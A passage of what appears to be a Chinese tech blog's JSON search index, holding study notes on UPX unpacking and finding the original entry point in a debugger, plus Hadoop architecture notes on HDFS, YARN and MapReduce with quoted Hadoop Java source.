NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"3. 第三个循环 重新跟踪代码，遇到如下循环： 这部分代码主要是恢复源代码的CALL/JMP指令（机器码：E8/E9）的destination地址。 到此为止，基本恢复了所有的压缩的源代码，最后设置下IAT即可成功。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:3:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"4. 第四个循环 01015436处下断： 此处edi被设置为01014000，指向第二个节区（UPX1）区域，该区域中保存着原程调用的API函数名称的字符串。 UPX在进行压缩时，会分析IAT，提取出原程序中调用的额API名称列表，形成api函数名称字符串。 使用这些API名称字符串调用01015467地址处的GetProcAddress()函数，获取API的起始地址，然后把API地址输入ebx寄存器所指的原程序的IAT区域，循环进行，直到完全恢复IAT。 然后，到01054bb的jmp指令处，跳转到OEP（原始EP）代码处： 至此，UPX的解压缩全部完成，后续进行notepad.exe的正常执行。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:3:4","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"五、快速查找UPX OEP的方法 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"1. 在POPAD指令后的JMP指令处设置断点 UPX压缩的特征之一是其EP代码被包含在PUSHAD/POPAD指令之间，并且在POPAD指令之后紧跟着的JMP指令会跳转到OEP代码处，所以可以在此处下断点，直接跳转到OEP地址处。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:4:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Tech"],"content":"2. 在栈中设置硬件断点 本质上也是利用 PUSHAD/POPAD指令的特点。因为eax～edi的值依次被保存到栈中，不管中间做了什么操作，想要运行OEP的代码就需要从栈中读取这些寄存器的值来恢复程序的原始运行状态，所以我们只要设置硬件断点监视栈中寄存器的值的变化就可以快速定位到OEP。 F8执行完pushad后，在od的dump窗口进入栈地址： 然后选中下硬件读断点： 直接F9，你会发现很快就来到PUSHAD后的JMP指令处。 最后，补充硬件断点的几个知识：硬件断点是CPU支持的断点，最多设置4个；执行完指令后再停止。 ","date":"2020-03-03","objectID":"/2020/03/RE4B-5/:4:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.5","uri":"/2020/03/RE4B-5/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-03","objectID":"/2020/03/Hadoop5/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(五)–HDFS ","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"一、架构 HDFS遵循主从架构。 Block数据块; 基本存储单位，一般大小为64M（配置大的块主要是因为：1）减少搜寻时间，一般硬盘传输速率比寻道时间要快，大的块可以减少寻道时间；2）减少管理块的数据开销，每个块都需要在NameNode上有对应的记录；3）对数据块进行读写，减少建立网络的连接成本） 一个大文件会被拆分成一个个的块，然后存储于不同的机器。如果一个文件少于Block大小，那么实际占用的空间为其文件的大小 基本的读写单位，类似于磁盘的页，每次都是读写一个块 每个块都会被复制到多台机器，默认复制3份 NameNode 存储文件的metadata，运行时所有数据都保存到内存，整个HDFS可存储的文件数受限于NameNode的内存大小 一个Block在NameNode中对应一条记录（一般一个block占用150字节），如果是大量的小文件，会消耗大量内存。同时map task的数量是由splits来决定的，所以用MapReduce处理大量的小文件时，就会产生过多的map task，线程管理开销将会增加作业时间。处理大量小文件的速度远远小于处理同等大小的大文件的速度。因此Hadoop建议存储大文件 数据会定时保存到本地磁盘，但不保存block的位置信息，而是由DataNode注册时上报和运行时维护（NameNode中与DataNode相关的信息并不保存到NameNode的文件系统中，而是NameNode每次重启后，动态重建） NameNode失效则整个HDFS都失效了，所以要保证NameNode的可用性 Secondary NameNode 定时与NameNode进行同步（定期合并文件系统镜像和编辑日志，然后把合并后的传给NameNode，替换其镜像，并清空编辑日志，类似于CheckPoint机制），但NameNode失效后仍需要手工将其设置成主机 DataNode 保存具体的block数据 负责数据的读写操作和复制操作 DataNode启动时会向NameNode报告当前存储的数据块信息，后续也会定时报告修改信息 DataNode之间会进行通信，复制数据块，保证数据的冗余性 ","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"二、写文件 1.客户端将文件写入本地磁盘的HDFS Client文件中 2.当临时文件大小达到一个block大小时，HDFS client通知NameNode，申请写入文件 3.NameNode在HDFS的文件系统中创建一个文件，并把该block id和要写入的DataNode的列表返回给客户端 4.客户端收到这些信息后，将临时文件写入DataNodes 4.1 客户端将文件内容写入第一个DataNode（一般以4kb为单位进行传输） 4.2 第一个DataNode接收后，将数据写入本地磁盘，同时也传输给第二个DataNode 4.3 依此类推到最后一个DataNode，数据在DataNode之间是通过pipeline的方式进行复制的 4.4 后面的DataNode接收完数据后，都会发送一个确认给前一个DataNode，最终第一个DataNode返回确认给客户端 4.5 当客户端接收到整个block的确认后，会向NameNode发送一个最终的确认信息 4.6 如果写入某个DataNode失败，数据会继续写入其他的DataNode。然后NameNode会找另外一个好的DataNode继续复制，以保证冗余性 4.7 每个block都会有一个校验码，并存放到独立的文件中，以便读的时候来验证其完整性 5.文件写完后（客户端关闭），NameNode提交文件（这时文件才可见，如果提交前，NameNode垮掉，那文件也就丢失了。fsync：只保证数据的信息写到NameNode上，但并不保证数据已经被写到DataNode中） Rack aware（机架感知） 通过配置文件指定机架名和DNS的对应关系 假设复制参数是3，在写入文件时，会在本地的机架保存一份数据，然后在另外一个机架内保存两份数据（同机架内的传输速度快，从而提高性能） 整个HDFS的集群，最好是负载平衡的，这样才能尽量利用集群的优势。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"三、读文件 客户端向NameNode发送读取请求 NameNode返回文件的所有block和这些block所在的DataNodes（包括复制节点） 客户端直接从DataNode中读取数据，如果该DataNode读取失败（DataNode失效或校验码不对），则从复制节点中读取（如果读取的数据就在本机，则直接读取，否则通过网络读取） ","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:3:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"四、可靠性 DataNode可以失效 DataNode会定时发送心跳到NameNode。如果一段时间内NameNode没有收到DataNode的心跳消息，则认为其失效。此时NameNode就会将该节点的数据（从该节点的复制节点中获取）复制到另外的DataNode中 数据可以毁坏 无论是写入时还是硬盘本身的问题，只要数据有问题（读取时通过校验码来检测），都可以通过其他的复制节点读取，同时还会再复制一份到健康的节点中 NameNode不可靠 ","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:4:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"五、命令工具 fsck: 检查文件的完整性 start-balancer.sh: 重新平衡HDFS hdfs dfs -copyFromLocal 从本地磁盘复制文件到HDFS ","date":"2020-03-03","objectID":"/2020/03/Hadoop5/:5:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(五)--HDFS","uri":"/2020/03/Hadoop5/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-03","objectID":"/2020/03/Hadoop4/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(四)–YARN ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"一、架构 YARN的架构如下图所示： YARN将资源管理和任务调度监控拆分成了独立的进程：一个全局的资源管理和一个每个作业的管理（ApplicationMaster）。 ResourceManager和NodeManager提供了计算资源的分配和管理，而ApplicationMaster则完成应用程序的运行。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"1. ResourceManager 负责全局的资源管理和任务调度，把整个集群当成计算资源池，只关注分配，不管应用，且不负责容错。 资源管理 以前资源是每个节点分成一个个的Map slot和Reduce slot，现在是一个个Container，每个Container可以根据需要运行ApplicationMaster、Map、Reduce或者任意的程序 以前的资源分配是静态的，目前是动态的，资源利用率更高 Container是资源申请的单位，一个资源申请格式：\u003cresource-name, priority, resource-requirement, number-of-containers\u003e, resource-name：主机名、机架名或*（代表任意机器）, resource-requirement：目前只支持CPU和内存 用户提交作业到ResourceManager，然后在某个NodeManager上分配一个Container来运行ApplicationMaster，ApplicationMaster再根据自身程序需要向ResourceManager申请资源 YARN有一套Container的生命周期管理机制，而ApplicationMaster和其Container之间的管理是应用程序自己定义的 任务调度 只关注资源的使用情况，根据需求合理分配资源 Scheluer可以根据申请的需要，在特定的机器上申请特定的资源（ApplicationMaster负责申请资源时的数据本地化的考虑，ResourceManager将尽量满足其申请需求，在指定的机器上分配Container，从而减少数据移动） 内部结构 Client Service: 应用提交、终止、输出信息（应用、队列、集群等的状态信息） Adaminstration Service: 队列、节点、Client权限管理 ApplicationMasterService: 注册、终止ApplicationMaster, 获取ApplicationMaster的资源申请或取消的请求，并将其异步地传给Scheduler, 单线程处理 ApplicationMaster Liveliness Monitor: 接收ApplicationMaster的心跳消息，如果某个ApplicationMaster在一定时间内没有发送心跳，则被任务失效，其资源将会被回收，然后ResourceManager会重新分配一个ApplicationMaster运行该应用（默认尝试2次） Resource Tracker Service: 注册节点, 接收各注册节点的心跳消息 NodeManagers Liveliness Monitor: 监控每个节点的心跳消息，如果长时间没有收到心跳消息，则认为该节点无效, 同时所有在该节点上的Container都标记成无效，也不会调度任务到该节点运行 ApplicationManager: 管理应用程序，记录和管理已完成的应用 ApplicationMaster Launcher: 一个应用提交后，负责与NodeManager交互，分配Container并加载ApplicationMaster，也负责终止或销毁 YarnScheduler: 资源调度分配， 有FIFO(with Priority)，Fair，Capacity方式 ContainerAllocationExpirer: 管理已分配但没有启用的Container，超过一定时间则将其回收 ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"2. NodeManager Node节点下的Container管理 启动时向ResourceManager注册并定时发送心跳消息，等待ResourceManager的指令 监控Container的运行，维护Container的生命周期，监控Container的资源使用情况 启动或停止Container，管理任务运行时的依赖包（根据ApplicationMaster的需要，启动Container之前将需要的程序及其依赖包、配置文件等拷贝到本地） 内部结构 NodeStatusUpdater: 启动向ResourceManager注册，报告该节点的可用资源情况，通信的端口和后续状态的维护 ContainerManager: 接收RPC请求（启动、停止），资源本地化（下载应用需要的资源到本地，根据需要共享这些资源） PUBLIC: /filecache PRIVATE: /usercache//filecache APPLICATION: /usercache//appcache//（在程序完成后会被删除） ContainersLauncher: 加载或终止Container ContainerMonitor: 监控Container的运行和资源使用情况 ContainerExecutor: 和底层操作系统交互，加载要运行的程序 ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"3. ApplicationMaster 单个作业的资源管理和任务监控 具体功能描述： 计算应用的资源需求，资源可以是静态或动态计算的，静态的一般是Client申请时就指定了，动态则需要ApplicationMaster根据应用的运行状态来决定 根据数据来申请对应位置的资源（Data Locality） 向ResourceManager申请资源，与NodeManager交互进行程序的运行和监控，监控申请的资源的使用情况，监控作业进度 跟踪任务状态和进度，定时向ResourceManager发送心跳消息，报告资源的使用情况和应用的进度信息 负责本作业内的任务的容错 ApplicationMaster可以是用任何语言编写的程序，它和ResourceManager和NodeManager之间是通过ProtocolBuf交互，以前是一个全局的JobTracker负责的，现在每个作业都一个，可伸缩性更强，至少不会因为作业太多，造成JobTracker瓶颈。同时将作业的逻辑放到一个独立的ApplicationMaster中，使得灵活性更加高，每个作业都可以有自己的处理方式，不用绑定到MapReduce的处理模式上 如何计算资源需求 一般的MapReduce是根据block数量来定Map和Reduce的计算数量，然后一般的Map或Reduce就占用一个Container 如何发现数据的本地化 通过HDFS的block分片信息获取 ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"4. Container 资源申请的单位和任务运行的容器： 基本的资源单位（CPU、内存等） Container可以加载任意程序，而且不限于Java 一个Node可以包含多个Container，也可以是一个大的Container ApplicationMaster可以根据需要，动态申请和释放Container ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"5. Failover 失败类型 程序问题 进程崩溃 硬件问题 失败处理 任务失败 运行时异常或者JVM退出都会报告给ApplicationMaster 通过心跳来检查挂住的任务(timeout)，会检查多次（可配置）才判断该任务是否失效 一个作业的任务失败率超过配置，则认为该作业失败 失败的任务或作业都会有ApplicationMaster重新运行 ApplicationMaster失败 ApplicationMaster定时发送心跳信号到ResourceManager，通常一旦ApplicationMaster失败，则认为失败，但也可以通过配置多次后才失败 一旦ApplicationMaster失败，ResourceManager会启动一个新的ApplicationMaster 新的ApplicationMaster负责恢复之前错误的ApplicationMaster的状态(yarn.app.mapreduce.am.job.recovery.enable=true)，这一步是通过将应用运行状态保存到共享的存储上来实现的，ResourceManager不会负责任务状态的保存和恢复 Client也会定时向ApplicationMaster查询进度和状态，一旦发现其失败，则向ResouceManager询问新的ApplicationMaster NodeManager失败 NodeManager定时发送心跳到ResourceManager，如果超过一段时间没有收到心跳消息，ResourceManager就会将其移除 任何运行在该NodeManager上的任务和ApplicationMaster都会在其他NodeManager上进行恢复 如果某个NodeManager失败的次数太多，ApplicationMaster会将其加入黑名单（ResourceManager没有），任务调度时不在其上运行任务 ResourceManager失败 通过checkpoint机制，定时将其状态保存到磁盘，然后失败的时候，重新运行 通过zookeeper同步状态和实现透明的HA 可以看出，一般的错误处理都是由当前模块的父模块进行监控（心跳）和恢复。而最顶端的模块则通过定时保存、同步状态和zookeeper来ֹ实现HA ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:1:5","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"二、基本流程 YARN的基本流程可以用以下两个图来表示： 1. Job submission 从ResourceManager中获取一个Application ID 检查作业输出配置，计算输入分片 拷贝作业资源（job jar、配置文件、分片信息）到HDFS，以便后面任务的执行 2. Job initialization ResourceManager将作业递交给Scheduler（有很多调度算法，一般是根据优先级）Scheduler为作业分配一个Container，ResourceManager就加载一个application master process并交给NodeManager管理ApplicationMaster主要是创建一系列的监控进程来跟踪作业的进度，同时获取输入分片，为每一个分片创建一个Map task和相应的reduce task Application Master还决定如何运行作业，如果作业很小（可配置），则直接在同一个JVM下运行 3. Task assignment ApplicationMaster向Resource Manager申请资源（一个个的Container，指定任务分配的资源要求）一般是根据data locality来分配资源 4. Task execution ApplicationMaster根据ResourceManager的分配情况，在对应的NodeManager中启动Container 从HDFSN#x4E2D;读取任务所需资源（job jar，配置文件等），然后执行该任务 5. Progress and status update 定时将任务的进度和状态报告给ApplicationMaster Client定时向ApplicationMaster获取整个任务的进度和状态 6. Job completion Client定时检查整个作业是否完成 作业完成后，会清空临时文件、目录等 ","date":"2020-03-03","objectID":"/2020/03/Hadoop4/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(四)--YARN","uri":"/2020/03/Hadoop4/"},{"categories":["Vuln"],"content":"记录Hadoop的学习和漏洞分析过程","date":"2020-03-03","objectID":"/2020/03/Hadoop3/","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"Hadoop–初学到漏洞(三)–MapReduce ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:0:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"一、简介 MapReduce是一种分布式计算方式，指定一个Map函数，把一组键值对映射成一组新的键值对，指定并发的Reduce（归约）函数，用来保证所有映射的键值对中的每一个共享相同的键组。 其Pattern图如下： map: (K1, V1) → list(K2, V2) combine: (K2, list(V2)) → list(K2, V2) reduce: (K2, list(V2)) → list(K3, V3) Map输出格式和Reduce输入格式一定是相同的。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:1:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"二、流程 ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:2:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"1. 基本流程 MapReduce主要是先读取文件数据，然后进行Map处理，接着Reduce处理，最后把处理结果写到文件中。流程图如下： ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:2:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"2. 详细流程 处理的详细流程如下： ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:2:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"3. 多节点下的流程 多节点的流程如下： ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:2:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"4. 数据角度流程处理 数据流的处理过程如下： Record reader 记录阅读器会翻译由输入格式生成的记录，记录阅读器用于将数据解析给记录，并不分析记录自身。它将数据以键值对的形式传输给mapper。通常键是位置信息，值是构成记录的数据存储块。 Map 在映射器中用户提供的代码称为中间对。键决定了数据分类的依据，而值决定了处理器中的分析信息.本书的设计模式将会展示大量细节来解释特定键值如何选择。 Shuffle and Sort ruduce任务以随机和排序步骤开始。此步骤写入输出文件并下载到本地计算机。这些数据采用键进行排序以把等价密钥组合到一起。 Reduce reducer采用分组数据作为输入。该功能传递键和此键相关值的迭代器。可以采用多种方式来汇总、过滤或者合并数据。当ruduce功能完成，就会发送0个或多个键值对。 输出格式 输出格式会转换最终的键值对并写入文件。默认情况下键和值以tab分割，各记录以换行符分割。因此可以自定义更多输出格式，最终数据会写入HDFS。 ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:2:4","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"三、分阶段过程详细分析 ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:0","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"1. Hadoop读取数据 通过InputFormat决定读取的数据的类型（可以是文件或数据库等），然后拆分成InputSplit，每个InputSplit对应一个Map处理，RecordReader读取InputSplit内容给到Map。 功能 验证作业输入的正确性，如格式等 将输入文件切割成逻辑分片（InputSplit），一个InputSplit分配给一个独立的Map任务 提供ReocrdReader实现，读取InputSplit中的“K-V”对给Mapper使用 方法 List getSplits(): 获取由输入文件计算出输入分片(InputSplit)，解决数据或文件分割成片问题 RecordReader createRecordReader(): 创建RecordReader，从InputSplit中读取数据，解决读取分片中数据问题 TextInputFormat: 输入文件中的每一行就是一个记录，Key是这一行的byte offset，而value是这一行的内容 KeyValueTextInputFormat: 输入文件中每一行就是一个记录，第一个分隔符字符切分每行。在分隔符字符之前的内容为Key，在之后的为Value。分隔符变量通过key.value.separator.in.input.line变量设置，默认为(\\t)字符。 NLineInputFormat: 与TextInputFormat一样，但每个数据块必须保证有且只有Ｎ行，mapred.line.input.format.linespermap属性，默认为１ SequenceFileInputFormat: 一个用来读取字符流数据的InputFormat，\u003ckey,value\u003e为用户自定义的。字符流数据是Hadoop自定义的压缩的二进制数据格式。它用来优化从一个MapReduce任务的输出到另一个MapReduce任务的输入之间的数据传输过程。\u003c/key,value\u003e **InputSplit：**代表一个个逻辑分片，并没有真正存储数据，只是提供了一个如何将数据分片的方法 Split内有Location信息，利于数据局部化。一个InputSplit给一个单独的Map处理 public abstract class InputSplit { /** * 获取Split的大小，支持根据size对InputSplit排序. */ public abstract long getLength() throws IOException, InterruptedException; /** * 获取存储该分片的数据所在的节点位置. */ public abstract String[] getLocations() throws IOException, InterruptedException; } ``` **RecordReader：**将InputSplit拆分成一个个\u003ckey,value\u003e对给Map处理，也是实际的文件读取分隔对象\u003c/key,value\u003e ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:1","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"2. 问题 大量小文件如何处理 CombineFileInputFormat可以将若干个Split打包成一个，目的是避免过多的Map任务（因为Split的数目决定了Map的数目，大量的Mapper Task创建销毁开销将是巨大的） 怎么计算split的 通常一个split就是一个block（FileInputFormat仅仅拆分比block大的文件），这样做的好处是使得Map可以在存储有当前数据的节点上运行本地的任务，而不需要通过网络进行跨节点的任务调度 通过mapred.min.split.size， mapred.max.split.size，block.size来控制拆分的大小 如果mapred.min.split.size大于block size，则会将两个block合成到一个split，这样有部分block数据需要通过网络读取 如果mapred.max.split.size小于block size，则会将一个block拆成多个split，增加了Map任务数（Map对split进行计算并且上报结果，关闭当前计算打开新的split均需要耗费资源） 先获取文件在HDFS上的路径和Block信息，然后根据splitSize对文件进行切分（ splitSize = computeSplitSize(blockSize, minSize, maxSize) ），默认splitSize 就等于blockSize的默认值（64m） public List\u003cInputSplit\u003e getSplits(JobContext job) throws IOException { // 首先计算分片的最大和最小值。这两个值将会用来计算分片的大小 long minSize = Math.max(getFormatMinSplitSize(), getMinSplitSize(job)); long maxSize = getMaxSplitSize(job); // generate splits List\u003cInputSplit\u003e splits = new ArrayList\u003cInputSplit\u003e(); List\u003cFileStatus\u003e files = listStatus(job); for (FileStatus file: files) { Path path = file.getPath(); long length = file.getLen(); if (length != 0) { FileSystem fs = path.getFileSystem(job.getConfiguration()); // 获取该文件所有的block信息列表[hostname, offset, length] BlockLocation[] blkLocations = fs.getFileBlockLocations(file, 0, length); // 判断文件是否可分割，通常是可分割的，但如果文件是压缩的，将不可分割 if (isSplitable(job, path)) { long blockSize = file.getBlockSize(); // 计算分片大小 // 即 Math.max(minSize, Math.min(maxSize, blockSize)); long splitSize = computeSplitSize(blockSize, minSize, maxSize); long bytesRemaining = length; // 循环分片。 // 当剩余数据与分片大小比值大于Split_Slop时，继续分片， 小于等于时，停止分片 while (((double) bytesRemaining)/splitSize \u003e SPLIT_SLOP) { int blkIndex = getBlockIndex(blkLocations, length-bytesRemaining); splits.add(makeSplit(path, length-bytesRemaining, splitSize, blkLocations[blkIndex].getHosts())); bytesRemaining -= splitSize; } // 处理余下的数据 if (bytesRemaining != 0) { splits.add(makeSplit(path, length-bytesRemaining, bytesRemaining, blkLocations[blkLocations.length-1].getHosts())); } } else { // 不可split，整块返回 splits.add(makeSplit(path, 0, length, blkLocations[0].getHosts())); } } else { // 对于长度为0的文件，创建空Hosts列表，返回 splits.add(makeSplit(path, 0, length, new String[0])); } } // 设置输入文件数量 job.getConfiguration().setLong(NUM_INPUT_FILES, files.size()); LOG.debug(\"Total # of splits: \" + splits.size()); return splits; } 分片间的数据如何处理 split是根据文件大小分割的，而一般处理是根据分隔符进行分割的，这样势必存在一条记录横跨两个split ​ 解决办法是只要不是第一个split，都会远程读取一条记录。不是第一个split的都忽略到第一条记录 public class LineRecordReader extends RecordReader\u003cLongWritable, Text\u003e { private CompressionCodecFactory compressionCodecs = null; private long start; private long pos; private long end; private LineReader in; private int maxLineLength; private LongWritable key = null; private Text value = null; // initialize函数即对LineRecordReader的一个初始化 // 主要是计算分片的始末位置，打开输入流以供读取K-V对，处理分片经过压缩的情况等 public void initialize(InputSplit genericSplit, TaskAttemptContext context) throws IOException { FileSplit split = (FileSplit) genericSplit; Configuration job = context.getConfiguration(); this.maxLineLength = job.getInt(\"mapred.linerecordreader.maxlength\", Integer.MAX_VALUE); start = split.getStart(); end = start + split.getLength(); final Path file = split.getPath(); compressionCodecs = new CompressionCodecFactory(job); final CompressionCodec codec = compressionCodecs.getCodec(file); // 打开文件，并定位到分片读取的起始位置 FileSystem fs = file.getFileSystem(job); FSDataInputStream fileIn = fs.open(split.getPath()); boolean skipFirstLine = false; if (codec != null) { // 文件是压缩文件的话，直接打开文件 in = new LineReader(codec.createInputStream(fileIn), job); end = Long.MAX_VALUE; } else { // 只要不是第一个split，则忽略本split的第一行数据 if (start != 0) { skipFirstLine = true; --start; // 定位到偏移位置，下次读取就会从偏移位置开始 fileIn.seek(start); } in = new LineReader(fileIn, job); } if (skipFirstLine) { // 忽略第一行数据，重新定位start start += in.readLine(new Text(), 0, (int) Math.min((long) Integer.MAX_VALUE, end - start)); } this.pos = start; } public boolean nextKeyValue() throws IOException { if (key == null) { key = new LongWritable(); } key.set(pos);// ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:2","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"3. Mapper 主要是读取InputSplit的每一个Key,Value对并进行处理： public class Mapper\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e { /** * 预处理，仅在map task启动时运行一次 */ protected void setup(Context context) throws IOException, InterruptedException { } /** * 对于InputSplit中的每一对\u003ckey, value\u003e都会运行一次 */ @SuppressWarnings(\"unchecked\") protected void map(KEYIN key, VALUEIN value, Context context) throws IOException, InterruptedException { context.write((KEYOUT) key, (VALUEOUT) value); } /** * 扫尾工作，比如关闭流等 */ protected void cleanup(Context context) throws IOException, InterruptedException { } /** * map task的驱动器 */ public void run(Context context) throws IOException, InterruptedException { setup(context); while (context.nextKeyValue()) { map(context.getCurrentKey(), context.getCurrentValue(), context); } cleanup(context); } } public class MapContext\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e extends TaskInputOutputContext\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e { private RecordReader\u003cKEYIN, VALUEIN\u003e reader; private InputSplit split; /** * Get the input split for this map. */ public InputSplit getInputSplit() { return split; } @Override public KEYIN getCurrentKey() throws IOException, InterruptedException { return reader.getCurrentKey(); } @Override public VALUEIN getCurrentValue() throws IOException, InterruptedException { return reader.getCurrentValue(); } @Override public boolean nextKeyValue() throws IOException, InterruptedException { return reader.nextKeyValue(); } } ","date":"2020-03-03","objectID":"/2020/03/Hadoop3/:3:3","tags":["Hadoop","Security"],"title":"Hadoop--初学到漏洞(三)--MapReduce","uri":"/2020/03/Hadoop3/"},{"categories":["Vuln"],"content":"4.Shuffle 对Map的结果进行排序并传输到Reduce进行处理 Map的结果并不是直接存放到硬盘,而是利用缓存做一些预排序处理 Map会调用Combiner，压缩，按key进行分区、排序等，尽量减少结果的大小 每个Map完成后都会通知Task，然后Reduce就可以进行处理 Map端 当Map程序开始产生结果的时候，并不是直接写到文件的，而是利用缓存做一些排序方面的预处理操作 每个Map任务都有一个循环内存缓冲区（默认100MB），当缓存的内容达到80%时，后台线程开始将内容写到文件，此时Map任务可以继续输出结果，但如果缓冲区满了，Map任务则需要等待 写文件使用round-robin方式。在写入文件之前，先将数据按照Reduce进行分区。对于每一个分区，都会在内存中根据key进行排序，如果配置了Combiner，则排序后执行Combiner（Combine之后可以减少写入文件和传输的数据） 每次结果达到缓冲区的阀值时，都会创建一个文件，在Map结束时，可能会产生大量的文件。在Map完成前，会将这些文件进行合并和排序。如果文件的数量超过3个，则合并后会再次运行Combiner（1、2个文件就没有必要了） 如果配置了压缩，则最终写入的文件会先进行压缩，这样可以减少写入和传输的数据 一旦Map完成，则通知任务管理器，此时Reduce就可以开始复制结果数据 Reduce端 Map的结果文件都存放到运行Map任务的机器的本地硬盘中 如果Map的结果很少，则直接放到内存，否则写入文件中 同时后台线程将这些文件进行合并和排序到一个更大的文件中（如果文件是压缩的，则需要先解压） 当所有的Map结果都被复制和合并后，就会调用Reduce方法 Reduce结果会写入到HDFS中 调优 一般的原则是给shuffle分配尽可能多的内存，但前提是要保证Map、Reduce任务有足够的内存 对于Map，主要就是避免把文件写入磁盘，例如使用Combiner，增大io.sort.mb的值 